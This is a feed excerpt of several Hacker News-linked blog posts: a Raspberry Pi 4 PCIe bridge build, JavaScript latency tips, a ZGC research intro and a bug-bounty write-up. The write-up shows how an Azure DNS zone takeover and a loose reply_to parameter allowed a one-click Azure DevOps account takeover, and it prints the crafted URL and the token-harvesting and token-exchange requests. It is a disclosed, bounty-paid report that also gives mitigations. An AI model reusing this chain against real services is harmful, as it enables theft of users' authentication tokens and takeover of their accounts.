port)</td></tr></tbody></table><figcaption>HSI and HSO (in and out) are from the perspective of the host controller. Where host HSO/TX will connect to device RX and host HSI/RX to device TX. Man, this is really confusing with TX, RX, device, host, passing through USB, which side is which… 😕</figcaption></figure> <p>There’s also a small hole near the centre, this allows any leftover solder from the large ground pad to have somewhere to go when placing the chip, otherwise the solder could end up squashed out around the edge, shorting out the pads. The PCB is slightly larger than the QFN68 package, as there is a limit on how close the copper can be to the edge. The fabricated PCB should be sanded down to the correct size, so that the cross-section of the copper pads can be seen at the edge of the PCB, just like on a QFN package.</p> <div><figure><a href="https://blog.zakkemble.net/wp-content/uploads/2020/06/chip_pads_cross.jpg" target="_blank" rel="noopener noreferrer"><img src="https://blog.zakkemble.net/wp-content/uploads/2020/06/chip_pads_cross-1024x768.jpg" alt="" srcset="https://blog.zakkemble.net/wp-content/uploads/2020/06/chip_pads_cross-1024x768.jpg 1024w, https://blog.zakkemble.net/wp-content/uploads/2020/06/chip_pads_cross-300x225.jpg 300w, https://blog.zakkemble.net/wp-content/uploads/2020/06/chip_pads_cross-768x576.jpg 768w, https://blog.zakkemble.net/wp-content/uploads/2020/06/chip_pads_cross-1536x1152.jpg 1536w, https://blog.zakkemble.net/wp-content/uploads/2020/06/chip_pads_cross.jpg 1760w" sizes="(max-width: 1024px) 100vw, 1024px"></a></figure></div> <div><figure><a href="https://blog.zakkemble.net/wp-content/uploads/2020/06/IMG_20200612_115732_BURST2.jpg" target="_blank" rel="noopener noreferrer"><img src="https://blog.zakkemble.net/wp-content/uploads/2020/06/IMG_20200612_115732_BURST2-1024x768.jpg" alt="" srcset="https://blog.zakkemble.net/wp-content/uploads/2020/06/IMG_20200612_115732_BURST2-1024x768.jpg 1024w, https://blog.zakkemble.net/wp-content/uploads/2020/06/IMG_20200612_115732_BURST2-300x225.jpg 300w, https://blog.zakkemble.net/wp-content/uploads/2020/06/IMG_20200612_115732_BURST2-768x576.jpg 768w, https://blog.zakkemble.net/wp-content/uploads/2020/06/IMG_20200612_115732_BURST2-1536x1152.jpg 1536w, https://blog.zakkemble.net/wp-content/uploads/2020/06/IMG_20200612_115732_BURST2-2048x1536.jpg 2048w" sizes="(max-width: 1024px) 100vw, 1024px"></a></figure></div> <center></center> <p>After replacing the VL805 with the bridge chip I tried a few PCIe cards that were laying around, the first was a Realtek RTL8168 based ethernet adapter… it didn’t work. Then I tried an ASMedia ASM1083 PCIe to PCI converter, that didn’t work either. I looked over all solder joints, checked for continuity, shorts, and everything seemed fine. I tried all kinds of things, like removing the capacitors and swapping the + and – of each signal in case they were swapped at the device end, as this is a feature of PCIe called <a rel="noreferrer noopener" href="https://teledynelecroy.com/doc/understanding-lane-reversal-and-polarity" target="_blank">polarity inversion</a> that maybe the controller did not support. The Pi just would not detect them. It seemed to be unable to train the PCIe link as <code>dmesg</code> showed <code>link down</code> instead of <code>link up, 2.5 Gbps x1 (!SSC)</code>. In the end I ordered a USB 3.0 expansion card containing a VL805, the same as the Pi. When it eventually arrived, I plugged it in and it was detected first time! I found a Realtek RTL8111 based ethernet adapter, and that worked too! After installing the driver for the RTL8111 it was able to obtain an IP from the DHCP server and I could ping the interface.</p> <div><figure><img src="https://blog.zakkemble.net/wp-content/uploads/2020/06/lspci_rpi4.png" alt="" srcset="https://blog.zakkemble.net/wp-content/uploads/2020/06/lspci_rpi4.png 628w, https://blog.zakkemble.net/wp-content/uploads/2020/06/lspci_rpi4-300x30.png 300w" sizes="(max-width: 628px) 100vw, 628px"></figure></div> <p>I wonder what it is about the RTL8168 and ASM1083 that makes them incompatible with the Raspberry Pi? Maybe they just don’t like the PCIe signals running through a load of USB connectors and cables.<br><strong>UPDATE 1:</strong> Using an ASM1184e PCIe switch and these two expansion cards are still not detected, so probably not signal issues. The device trees file has been modified to allow more than one PCIe device, as described in Colins blog post. Other cards work in the switch, just not these two.<br><strong>UDPATE 2:</strong> Nevermind, the problem with the ASM1083 was that I hadn’t connected the 5V rail, and is now detected by the Pi. RTL8168 still doesn’t work for some reason.</p> <div><figure><a href="https://blog.zakkemble.net/wp-content/uploads/2020/06/IMG_20200612_164557_BURST2.jpg" target="_blank" rel="noopener noreferrer"><img src="https://blog.zakkemble.net/wp-content/uploads/2020/06/IMG_20200612_164557_BURST2-1024x768.jpg" alt="" srcset="https://blog.zakkemble.net/wp-content/uploads/2020/06/IMG_20200612_164557_BURST2-1024x768.jpg 1024w, https://blog.zakkemble.net/wp-content/uploads/2020/06/IMG_20200612_164557_BURST2-300x225.jpg 300w, https://blog.zakkemble.net/wp-content/uploads/2020/06/IMG_20200612_164557_BURST2-768x576.jpg 768w, https://blog.zakkemble.net/wp-content/uploads/2020/06/IMG_20200612_164557_BURST2-1536x1152.jpg 1536w, https://blog.zakkemble.net/wp-content/uploads/2020/06/IMG_20200612_164557_BURST2-2048x1536.jpg 2048w" sizes="(max-width: 1024px) 100vw, 1024px"></a></figure></div> <p>A quick test using 4 USB 3.0 flash drives plugged into the VL805 expansion card resulted with a total read throughput of 3 Gbps out of a maximum theoretical throughput of 4 Gbps over a 5 Gbps PCIe 2.0 link. The flash drives had their read speeds almost maxed out, probably slowed down slightly from overhead of having to switch between each drive while reading.<br><strong>UPDATE: </strong>Another test with 5 USB flash drives, a USB hub and a USB-to-Ethernet adapter resulted in 3 Gbps again, so this seems like a limitation of the VL805 or CPU. Other RPi4 benchmarks using SSDs through USB 3 also maxed out at 3 Gbps.</p> <p>The RESET and WAKE traces on the riser board should be cut, otherwise RESET will be connected to GND preventing the card from starting and WAKE will be connected to 5V possibly damaging the device if that pin is not 5V tolerant. The RESET line should then have a 10k pullup connected to the 3.3V supply, or connected to the D- signal of the lower USB 3.0 port of the Pi.</p> <p>Colin mentioned that Thomasz also had kernel panic problems with his setup, I had a few panics and freezes too, but they seemed to be caused by wiggling the PCIe card a little too much.</p> <p><a rel="noreferrer noopener" href="https://docs.turris.cz/hw/mox/Turris_Mox_F.pdf" target="_blank">This pdf</a> has a full schematic using a VL805 on pages 7 and 8 (pictured below), very handy since any information about the chip is scarce.</p> <div><figure><a href="https://blog.zakkemble.net/wp-content/uploads/2020/06/Turris_Mox_F-pg7_8.png" target="_blank" rel="noopener noreferrer"><img src="https://blog.zakkemble.net/wp-content/uploads/2020/06/Turris_Mox_F-pg7_8-150x150.png" alt=""></a></figure></div> <p>These “chips” are available to buy from my <a href="https://www.tindie.com/products/20478/" target="_blank" rel="noreferrer noopener">Tindie store</a>! Or they can be ordered directly from me, send an email to shop@zakkemble.net</p> <div><figure><a href="https://www.tindie.com/products/20478/" target="_blank" rel="noopener noreferrer"><img src="https://blog.zakkemble.net/wp-content/uploads/2020/02/tindie_robodog.png" alt=""></a></figure></div> <p><strong>PCB designs and things are on <a rel="noreferrer noopener" href="https://github.com/zkemble/RPi4-PCIe-Bridge" target="_blank">GitHub</a></strong></p> </div></div>]]>
            </description>
            <link>https://blog.zakkemble.net/rpi4-pci-express-bridge-chip/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23701208</guid>
            <pubDate>Wed, 01 Jul 2020 13:43:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A tale of latency and broken windows]]>
            </title>
            <description>
<![CDATA[
Score 38 | Comments 16 (<a href="https://news.ycombinator.com/item?id=23700897">thread link</a>) | @yenkel
<br/>
July 1, 2020 | https://yenkel.dev/posts/a-tale-of-latency-and-broken-windows | <a href="https://web.archive.org/web/*/https://yenkel.dev/posts/a-tale-of-latency-and-broken-windows">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><p>As a software developer you might be familiar with <a href="http://norvig.com/21-days.html#answers" target="_blank" rel="nofollow noopener noreferrer">the following table</a><a name="latency-table"></a>:
<img src="https://yenkel.dev/media/2020-06-27/latency.png"></p><p>Even if the times are not exact and up to date for 2020, the gist of it is clear. Some operations (disk, network) are more expensive than others. When looking to minimize latency, start from operations that are more likely to take longer, because they are naturally slower due to hardware and speed of light limitations.</p><p>The importance of latency will depend on the software you are writing. For some software latency can business critical:</p><ul><li><a href="https://en.wikipedia.org/wiki/Real-time_computing" target="_blank" rel="nofollow noopener noreferrer">Real-time computing</a> where operations must guarantee completion under a deadline.</li><li>A SaaS with latency SLAs that you need to meet for your enterprise customers </li><li>e-commerce that loses money when the site is slow (see this great blog post about <a href="http://blog.tacertain.com/p-four-nines/" target="_blank" rel="nofollow noopener noreferrer">Amazon</a>).</li></ul><p>You might also be writing software that you want to be “fast enough” or “not unnecessarily slow”.</p><p>While getting to concrete latency guarantees for critical cases requires a lot of work and investment, it is also true that latency is one of those things that is easy to overlook unless you are paying attention. Over time, small decisions can pile up and you can end up with a product that is a lot slower than it should be mostly because of <a href="http://faculty.salisbury.edu/~xswang/Research/Papers/SERelated/no-silver-bullet.pdf" target="_blank" rel="nofollow noopener noreferrer">accidental complexity, not essential complexity</a>. </p><p>The “broken windows” theory presents the problem in a nice way (From <a href="https://en.wikipedia.org/wiki/Broken_windows_theory" target="_blank" rel="nofollow noopener noreferrer">wikipedia</a>): <em>The broken windows theory is a criminological theory that states that visible signs of crime, anti-social behavior, and civil disorder create an urban environment that encourages further crime and disorder, including serious crimes. The theory suggests that policing methods that target minor crimes such as vandalism, loitering, public drinking, jaywalking and fare evasion help to create an atmosphere of order and lawfulness, thereby preventing more serious crimes.</em>
<img src="https://yenkel.dev/media/2020-06-27/broken-windows.jpg"></p><p>Whether the theory is correct or not (there is an interesting chapter on this in the book <a href="https://www.amazon.com/Freakonomics-Economist-Explores-Hidden-Everything/dp/0060731338" target="_blank" rel="nofollow noopener noreferrer">Freakonomics</a>) it is a useful context to talk about software. In the software industry, the Pragmatic Programmer book states <a href="https://www.artima.com/intv/fixit.html" target="_blank" rel="nofollow noopener noreferrer">“don’t live with broken windows”</a>.
If we apply this to latency it is easy to reason that if you let small decisions/changes increase latency, over time the latency of the system will continuously increase over time. At some point, going back and figuring things out will be overly complex and sometimes teams decide to go for complicated solutions to solve this problem. We want to avoid that.</p><p>One of the things we do at <a href="http://auth0.com/" target="_blank" rel="nofollow noopener noreferrer">Auth0</a> is iterative delivery. Initial versions of code work and are tested, etc., but until we validate features with customers we avoid investing in optimizations. </p><p>However, some things can be done in an initial implementation so we don’t need to optimize later, as that’s when as a developer you have the context about what you are doing. Re-thinking many small decisions a few weeks down the road is less than ideal. In this context, thinking about “expensive operations” latency wise is useful.</p><p>As part of a project, we are working on developing a new service (<code>new-service</code>) and adding some calls to it from an existing service (<code>client</code>). As we reviewed the changes we made to the <code>client</code> with the team, we found several opportunities for improvement.</p><p>The code snippets below are examples written using Javascript, but these ideas are language agnostic.</p><h2 id="parallel-io"><a href="#parallel-io" aria-label="parallel io permalink"></a>Parallel I/O</h2><blockquote><p>When I/O ops do not depend on each other and you need all data if possible use parallel queries.</p></blockquote><p>Let’s say a change to client code looked like this:</p><div data-language="js"><pre><code>     <span>const</span> a <span>=</span> <span>await</span> <span>callExistingService</span><span>(</span><span>...</span><span>)</span><span>;</span>
<span>+</span>    <span>const</span> b <span>=</span> <span>await</span> <span>callNewService</span><span>(</span><span>...</span><span>)</span><span>;</span>
<span>+</span>    </code></pre></div><p>The <code>getDataFromNewService(...)</code> call performs network I/O. Because we are working on this <code>new-service</code>, we know it also does more network I/O to talk to a database (which might need to do some disk I/O). All of these operations are naturally in the slow end of the spectrum from the <a href="#latency-table">table at the beginning of this blog post</a>.</p><p>If we can’t avoid the operations, performing these in parallel yields some clear benefits. If the resulting code looks like this:</p><div data-language="js"><pre><code><span>const</span> <span>[</span>a<span>,</span> b<span>]</span> <span>=</span> <span>await</span> Promise<span>.</span><span>all</span><span>(</span><span>[</span>
    <span>callExistingService</span><span>(</span><span>...</span><span>)</span><span>,</span> 
    <span>callNewService</span><span>(</span><span>...</span><span>)</span>
<span>]</span><span>)</span><span>;</span></code></pre></div><p>If we call the time for these operations <code>t1</code> (<code>existing-service</code>) and <code>t2</code> (<code>new-service</code>), in the last example we change the latency from <code>sum(t1, t2)</code> to <code>max(t1, t2)</code>. That even means that if we don’t want to make latency higher than the original, all we need to do is ensure <code>t2 &lt;= t1</code>!</p><h2 id="pre-fetching"><a href="#pre-fetching" aria-label="pre fetching permalink"></a>Pre-fetching</h2><blockquote><p>When I/O operations op2 only runs if op1 is likely to be successful, if op1 is likely to be successful in most cases, consider doing op2 in parallel (<a href="https://en.wikipedia.org/wiki/Prefetching" target="_blank" rel="nofollow noopener noreferrer">pre-fetching</a>).</p></blockquote><p>This case is similar to the previous one, but might be easier to miss. Let’s say the code after the change looks like this:</p><div data-language="js"><pre><code>    <span>const</span> param <span>=</span> <span>...</span>
    <span>const</span> exists <span>=</span> <span>await</span> <span>callExistingService</span><span>(</span>param<span>)</span><span>;</span>
    <span>if</span> <span>(</span><span>!</span>exists<span>)</span> <span>{</span>
        
    <span>}</span>
<span>+</span>   <span>const</span> b <span>=</span> <span>await</span> <span>callNewService</span><span>(</span>param<span>)</span><span>;</span>
<span>+</span>   </code></pre></div><p>Both function calls depend on <code>param</code>, which is available before calling <code>callExistingService(param)</code>. If the likelihood of <code>exists</code> being false is low, then calling <code>callNewService(param)</code> in parallel is likely worth it. You won’t be adding a lot more load to <code>new-service</code> in case <code>exists === false</code>, but you will be getting the aforementioned benefits for parallel I/O.</p><p>The latency improved code would look like this:</p><div data-language="js"><pre><code><span>const</span> param <span>=</span> <span>...</span>
<span>const</span> <span>[</span>exists<span>,</span> b<span>]</span> <span>=</span> <span>await</span> Promise<span>.</span><span>all</span><span>(</span><span>[</span>
  <span>callExistingService</span><span>(</span>param<span>)</span><span>,</span> 
  <span>callNewService</span><span>(</span>param<span>)</span><span>]</span><span>)</span><span>;</span>

<span>if</span> <span>(</span><span>!</span>exists<span>)</span> <span>{</span>
    
<span>}</span>
</code></pre></div><h2 id="no-op"><a href="#no-op" aria-label="no op permalink"></a>No-op</h2><blockquote><p>When you can replace an I/O operation for a no-op, do it.</p></blockquote><p>The best performance/latency optimization is a “no-op”, i.e. figuring out how to prevent the call from happening. A simple way of doing this is caching. However, it is important to consider that caching does not need to be overly complicated and require every developer’s favorite hammer <a href="https://redis.io/" target="_blank" rel="nofollow noopener noreferrer">Redis</a>. It just means <em>to store the value of computation to prevent performing the computation again</em>. </p><p>The code we reviewed was doing this:</p><div data-language="js"><pre><code>    
    <span>const</span> context <span>=</span> <span>await</span> <span>hydrateContext</span><span>(</span><span>)</span><span>;</span>
    <span>...</span>
    
<span>+</span>   <span>const</span> result <span>=</span> <span>callNewService</span><span>(</span>context<span>.</span>param<span>)</span><span>;</span></code></pre></div><p>In this situation, the <code>client</code> had a way to store the result of a previous call to <code>new-service</code> that returned the same value. If <code>result</code> is relatively small and does not change it can be stored with the context and loaded as part of <code>hydrateContext()</code>. That way, the call we can simply avoid <code>callNewService(context.param);</code>.</p><p>The fastest call is the call that never happens 😆</p><p>When you are working on code, don’t <a href="https://wiki.c2.com/?PrematureOptimization" target="_blank" rel="nofollow noopener noreferrer">optimize prematurely</a>. I recommend, however, you add a “mental checklist” item to focus on latency and cross it off before submitting a PR. That will help you find <a href="https://wiki.c2.com/?PrematureOptimization" target="_blank" rel="nofollow noopener noreferrer">Donald Knuth’s 3%</a>.</p><p>It is likely that just doing that and focusing on that latency for 10 minutes might point to small but valuable improvements that you can make, and accumulating latency over time.</p><p>Don’t live with latency broken windows!</p></div></div></div></div>]]>
            </description>
            <link>https://yenkel.dev/posts/a-tale-of-latency-and-broken-windows</link>
            <guid isPermaLink="false">hacker-news-small-sites-23700897</guid>
            <pubDate>Wed, 01 Jul 2020 13:08:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Taking over Azure DevOps accounts with one click]]>
            </title>
            <description>
<![CDATA[
Score 90 | Comments 17 (<a href="https://news.ycombinator.com/item?id=23700800">thread link</a>) | @infosecau
<br/>
July 1, 2020 | https://blog.assetnote.io/2020/06/28/subdomain-takeover-to-account-takeover/ | <a href="https://web.archive.org/web/*/https://blog.assetnote.io/2020/06/28/subdomain-takeover-to-account-takeover/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
          <p>When performing subdomain takeovers, you should be asking yourself, what is the impact, and how do I prove it? This was especially the case when taking over the subdomain <code>project-cascade.visualstudio.com</code>.</p>

<p>At first glance, it didn’t seem like we could do much by taking this subdomain over as nothing super sensitive lived under <code>*.visualstudio.com</code>. However, under deeper examination, we were able to exploit a trust boundary, leading to a 1 click account takeover of Azure DevOps accounts.</p>

<h2 id="technical-details">Technical Details</h2>

<p>Through automation, we found the subdomain <code>project-cascade.visualstudio.com</code>, which was vulnerable to an Azure Zone DNS takeover.</p>

<p>The NS records for <code>project-cascade.visualstudio.com</code> were pointing to Azure DNS, however they were no longer registered on Azure DNS. This resulted in the lookups being refused, as shown below:</p>

<pre><code>dns-takeover lookup project-cascade.visualstudio.com. on nameserver ns3-05.azure-dns.org status: [Refused]           
dns-takeover lookup project-cascade.visualstudio.com. on nameserver ns2-05.azure-dns.net status: [Refused]
dns-takeover lookup project-cascade.visualstudio.com. on nameserver ns1-05.azure-dns.com status: [Refused]          
dns-takeover lookup project-cascade.visualstudio.com. on nameserver ns4-05.azure-dns.info status: [Refused]
</code></pre>

<p>As the lookups were being refused, we were able to to register the subdomain under an Azure account that we owned. By doing so, we were able to create arbitrary DNS records for the subdomain <code>project-cascade.visualstudio.com</code>:
<br></p>

<table>
  <thead>
    <tr>
      <th><img src="https://blog.assetnote.io/images/assetnote-azure-0.png" alt="" width="100%"></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><em>Azure Console with <code>project-cascade.visualstudio.com</code> registered as a DNS Zone</em></td>
    </tr>
  </tbody>
</table>

<p><br>
From this point on wards, we registered two records:</p>

<ul>
  <li>TXT Record - <code>txt.project-cascade.visualstudio.com</code> with the value of <code>Azure DNS Zone Takeover POC</code> (proof of concept)</li>
  <li>A Record - <code>arec.project-cascade.visualstudio.com</code> with the value of <code>3.88.203.203</code> (our host)</li>
</ul>

<pre><code>$ dig txt txt.project-cascade.visualstudio.com @1.1.1.1

...omitted for brevity...

;; ANSWER SECTION:
txt.project-cascade.visualstudio.com. 10 IN TXT "Azure DNS Zone Takeover POC"

$ dig a arec.project-cascade.visualstudio.com @1.1.1.1

...omitted for brevity...

;; ANSWER SECTION:
arec.project-cascade.visualstudio.com. 2475 IN A 3.88.203.203

</code></pre>

<h2 id="so-whats-next">So, what’s next?</h2>

<p>Now that we had successfully taken the subdomain over, it was time to investigate the security impact.</p>

<p>We discovered that there were subdomains underneath <code>visualstudio.com</code> that facilitated an authentication flow through <code>login.microsoftonline.com</code>.</p>

<p>For example, when visiting  <code>app.vssps.visualstudio.com</code>, we were redirected to:</p>

<pre><code>https://app.vssps.visualstudio.com/_signin?realm=app.vsaex.visualstudio.com&amp;reply_to=https%3A%2F%2Fapp.vsaex.visualstudio.com%2F&amp;redirect=1&amp;context=eyJodCI6MywiaGlkIjoiNDA0ODFkZDAtZDUzMS1hMWE2LWQ0MzYtMDQxNTk3MWI0MmQ2IiwicXMiOnt9LCJyciI6IiIsInZoIjoiIiwiY3YiOiIiLCJjcyI6IiJ90#ctx=eyJTaWduSW5Db29raWVEb21haW5zIjpbImh0dHBzOi8vbG9naW4ubWljcm9zb2Z0b25saW5lLmNvbSJdfQ2
</code></pre>

<p>Which then redirected to:</p>

<pre><code>https://login.microsoftonline.com/...omitted...
</code></pre>

<p>The most important thing to note from the URLs above, is the following parameter and value for the endpoint <code>https://app.vssps.visualstudio.com/_signin</code>:</p>

<p><code>reply_to=https%3A%2F%2Fapp.vsaex.visualstudio.com%2F</code></p>

<p>Through some testing, we determined that this authentication flow had a loosely configured <code>reply_to</code> address, allowing any domain under <code>*.visualstudio.com</code> to recieve the authentication tokens.</p>

<p>In order to demonstrate this account takeover flow, we crafted the following URL:</p>

<pre><code>https://app.vssps.visualstudio.com/_signin?realm=app.vsaex.visualstudio.com&amp;reply_to=https%3A%2F%2Farec.project-cascade.visualstudio.com%2F&amp;redirect=1&amp;context=eyJodCI6MywiaGlkIjoiNDA0ODFkZDAtZDUzMS1hMWE2LWQ0MzYtMDQxNTk3MWI0MmQ2IiwicXMiOnt9LCJyciI6IiIsInZoIjoiIiwiY3YiOiIiLCJjcyI6IiJ90
</code></pre>

<p>In the URL above, note that we changed the value of the <code>reply_to</code> parameter to contain the following: <code>https%3A%2F%2Farec.project-cascade.visualstudio.com%2F</code> (our subdomain takeover).</p>

<p>This will prompt the user to login via the normal microsoft live.com auth flow, or if the user is already logged in, proceed with the signin and redirect request.</p>

<table>
  <thead>
    <tr>
      <th><img src="https://blog.assetnote.io/images/assetnote-azure-login.png" alt="" width="100%"></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><em>Visual Studio Authentication Flow via <code>login.microsoftonline.com</code></em></td>
    </tr>
  </tbody>
</table>



<p>Once logged in, this resulted in the following request being made which ultimately resulted in a POST request to our controlled domain <code>arec.project-cascade.visualstudio.com</code>.</p>

<pre><code>POST /_signedin?realm=arec.project-cascade.visualstudio.com&amp;protocol=&amp;reply_to=https%3A%2F%2Farec.project-cascade.visualstudio.com%2F HTTP/1.1
Host: arec.vssps.visualstudio.com
Cookie: ...omitted for brevity...

id_token=&lt;snip&gt;&amp;FedAuth=&lt;snip&gt;&amp;FedAuth1=&lt;snip&gt;%2B
</code></pre>

<p>Our controlled domain received the following request which contains authentication tokens for <code>app.vsaex.visualstudio.com</code></p>

<pre><code>POST /_signedin?realm=arec.project-cascade.visualstudio.com&amp;protocol=&amp;reply_to=https%3A%2F%2Farec.project-cascade.visualstudio.com%2F HTTP/1.1
Host: arec.project-cascade.visualstudio.com
Content-Length: 4634
Referer: https://arec.vssps.visualstudio.com/_signedin?realm=arec.project-cascade.visualstudio.com&amp;protocol=&amp;reply_to=https%3A%2F%2Farec.project-cascade.visualstudio.com%2F
Cookie: ...omitted for brevity...

id_token=&lt;snip&gt;&amp;FedAuth=&lt;snip&gt;&amp;FedAuth1=&lt;snip&gt;
</code></pre>

<table>
  <thead>
    <tr>
      <th><img src="https://blog.assetnote.io/images/assetnote-azure-1.5.png" alt="" width="100%"></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><em>Final Authentication Token received by arec.project-cascade.visualstudio.com (controlled by us)</em></td>
    </tr>
  </tbody>
</table>



<h2 id="what-can-this-token-be-used-for">What can this token be used for?</h2>

<p>We found that we could exchange the stolen authentication token for a Bearer token through <code>app.vsaex.visualstudio.com</code>. This Bearer token could then be used to authenticate to <code>vsaex.visualstudio.com</code>, <code>dev.azure.com</code> and <code>vssps.dev.azure.com</code>.</p>

<pre><code>POST /_apis/WebPlatformAuth/SessionToken HTTP/1.1
Host: app.vsaex.visualstudio.com
Connection: close
Content-Length: 105
Origin: https://app.vsaex.visualstudio.com
X-VSS-ReauthenticationAction: Suppress
Content-Type: application/json
Accept: application/json;api-version=6.0-preview.1;excludeUrls=true
X-Requested-With: XMLHttpRequest
...omitted for brevity...
Cookie: UserAuthentication=&lt;snipped id_token&gt;; FedAuth=&lt;snipped FedAuth&gt;; FedAuth1=&lt;snipped&gt;

{"appId":"00000000-0000-0000-0000-000000000000","force":false,"tokenType":0,"namedTokenId":"Aex.Profile"}
</code></pre>

<p>This request returns the following response with a valid bearer token that can be used elsewhere</p>

<pre><code>HTTP/1.1 200 OK
Cache-Control: no-cache, no-store, must-revalidate
Pragma: no-cache
Content-Length: 933
Content-Type: application/json; charset=utf-8; api-version=6.0-preview.1
...omitted for brevity...

{"appId":"00000000-0000-0000-0000-000000000000","token":"&lt;snip&gt;","tokenType":"session","validTo":"2020-05-12T06:45:47.2007474Z","namedTokenId":"Aex.Profile"}
</code></pre>

<p>e.g. on <code>app.vsaex.visualstudio.com</code> this token can be used to pull the user’s email</p>

<pre><code>GET /_apis/User/User HTTP/1.1
Host: app.vsaex.visualstudio.com
Connection: close
X-TFS-FedAuthRedirect: Suppress
X-VSS-ReauthenticationAction: Suppress
X-Requested-With: XMLHttpRequest
Accept-Language: en-US
Authorization: Bearer &lt;snip just recieved bearer token&gt;
Accept: application/json;api-version=6.0-preview.1;excludeUrls=true
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36
X-TFS-Session: ab1e4b56-599c-4ab6-9f5e-756c486a0f2b
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Referer: https://app.vsaex.visualstudio.com/me?mkt=en-US
Accept-Encoding: gzip, deflate


HTTP/1.1 200 OK
Cache-Control: no-cache
Pragma: no-cache
Content-Length: 258
...omitted for brevity...

{"descriptor":"msa.NTg0Zjc4NDAtYzc5ZC03MWU0LWJkN2ItMDZhY2Y1N2Q2OTA1","displayName":"s","mail":"&lt;account_email&gt;","unconfirmedMail":null,"country":"AU","dateCreated":"2018-05-25T23:19:53.6843383+00:00","lastModified":"2019-01-06T15:43:50.2963651+00:00","revision":0}
</code></pre>

<p>The Bearer token could be used to access <code>https://app.vsaex.visualstudio.com/me?mkt=en-US</code> which we found to disclose project names for the associated user on <code>dev.azure.com</code>.</p>

<table>
  <thead>
    <tr>
      <th><img src="https://blog.assetnote.io/images/assetnote-azure-1.png" alt="" width="100%"></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><em>Access to <code>app.vsaex.visualstudio.com/me</code> through the stolen token</em></td>
    </tr>
  </tbody>
</table>



<p>Ultimately, this allowed us to use the token on <code>dev.azure.com</code> to access resources:</p>

<pre><code>GET /seanyeoh/_usersSettings/keys?__rt=fps&amp;__ver=2 HTTP/1.1
Host: dev.azure.com
Connection: close
x-tfs-fedauthredirect: Suppress
Origin: https://dev.azure.com
x-vss-reauthenticationaction: Suppress
authorization: Bearer &lt;snip&gt;
accept: application/json;api-version=5.0-preview.1;excludeUrls=true;enumsAsNumbers=true;msDateFormat=true;noArrayWrap=true
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36
Sec-Fetch-Site: same-site
Sec-Fetch-Mode: cors
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

</code></pre>

<table>
  <thead>
    <tr>
      <th><img src="https://blog.assetnote.io/images/assetnote-azure-2.png" alt="" width="100%"></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><em>Accessing resources from dev.azure.com with the generated token</em></td>
    </tr>
  </tbody>
</table>



<p>A malicious attacker could perform a 1 click drive by attack on an unsuspecting user by directing them to a URL such as:</p>

<pre><code>https://app.vssps.visualstudio.com/_signin?realm=app.vsaex.visualstudio.com&amp;reply_to=https%3A%2F%2Farec.project-cascade.visualstudio.com%2F&amp;redirect=1&amp;context=eyJodCI6MywiaGlkIjoiNDA0ODFkZDAtZDUzMS1hMWE2LWQ0MzYtMDQxNTk3MWI0MmQ2IiwicXMiOnt9LCJyciI6IiIsInZoIjoiIiwiY3YiOiIiLCJjcyI6IiJ90
</code></pre>

<p>This would result in their <code>app.vsaex.visualstudio.com</code> tokens being disclosed.</p>

<p>From this point, the the attacker would have full control over the user’s Azure DevOps account.</p>

<p>Additionally, the zone takeover of project-cascade.visualstudio.com could have beeen used to validate ownership over the <code>project-cascade.visualstudio.com</code> domain, setup MX records to capture emails to <code>*.project-cascade.visualstudio.com</code> and prove ownership to create SSL certificates. This may have resulted in various opportunities for fraud and impersonation of Microsoft services.</p>



<p>This attack could be mitigated at two points:</p>
<ol>
  <li>Not having the dangling dns zone <code>project-cascade.visualstudio.com</code></li>
  <li>Restricting the reply_to url for visualstudio tokens on <code>app.vssps.visualstudio.com</code> to the realm for <code>app.vsaex.visualstudio.com</code></li>
</ol>


<ol>
  <li>20th May 2020 - Report filed</li>
  <li>22nd May 2020 - Issue triaged</li>
  <li>22nd May 2020 - $3000 Bounty Awarded</li>
</ol>

<table>
  <thead>
    <tr>
      <th><img src="https://blog.assetnote.io/images/assetnote-azure-3.png" alt="" width="100%"></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><em>Bount…</em></td></tr></tbody></table></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.assetnote.io/2020/06/28/subdomain-takeover-to-account-takeover/">https://blog.assetnote.io/2020/06/28/subdomain-takeover-to-account-takeover/</a></em></p>]]>
            </description>
            <link>https://blog.assetnote.io/2020/06/28/subdomain-takeover-to-account-takeover/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23700800</guid>
            <pubDate>Wed, 01 Jul 2020 12:56:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Compact forwarding information for the Z Garbage Collector in the OpenJDK]]>
            </title>
            <description>
<![CDATA[
Score 60 | Comments 8 (<a href="https://news.ycombinator.com/item?id=23700451">thread link</a>) | @pjmlp
<br/>
July 1, 2020 | https://inside.java/2020/06/25/compact-forwarding/ | <a href="https://web.archive.org/web/*/https://inside.java/2020/06/25/compact-forwarding/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="entry"><hr>

<p><em>The work presented here is performed as part of the <a href="https://inside.java/2020/06/12/joint-research-projects/">joint research project between Oracle, Uppsala University and KTH</a>. Follow the blog series here at inside.java to read more about the JVM research performed at the Oracle Development office in Stockholm.</em></p>

<hr>

<p>This is a short description about my work on garbage collection that I did for my master thesis. This work was done in collaboration with <a href="https://www.oracle.com/">Oracle</a> which gave me an opportunity to work with brilliant minds on challenging problems. I want to direct a special shoutout to my mentors at Oracle, <a href="https://inside.java/u/PerLiden/">Per Lidén</a> and <a href="https://inside.java/u/ErikOsterlund/">Erik Österlund</a>.</p>

